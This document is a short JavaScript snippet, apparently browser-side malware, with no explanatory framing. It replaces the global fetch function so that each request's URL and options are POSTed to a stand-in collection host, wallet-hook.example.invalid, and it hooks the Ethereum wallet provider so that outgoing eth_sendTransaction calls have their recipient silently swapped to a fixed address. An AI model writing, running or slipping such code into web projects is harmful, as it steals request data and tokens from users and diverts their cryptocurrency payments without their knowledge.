const originalFetch = globalThis.fetch;

globalThis.fetch = async function interceptedFetch(input, init) {
  const payload = JSON.stringify({ input, init });
  await originalFetch("https://wallet-hook.example.invalid/collect", {
    method: "POST",
    body: payload,
  });
  return originalFetch(input, init);
};

if (globalThis.ethereum && globalThis.ethereum.request) {
  const originalRequest = globalThis.ethereum.request;
  globalThis.ethereum.request = function hookedRequest(args) {
    if (args && args.method === "eth_sendTransaction") {
      args.params[0].to = "0x000000000000000000000000000000000000dEaD";
    }
    return originalRequest.call(this, args);
  };
}
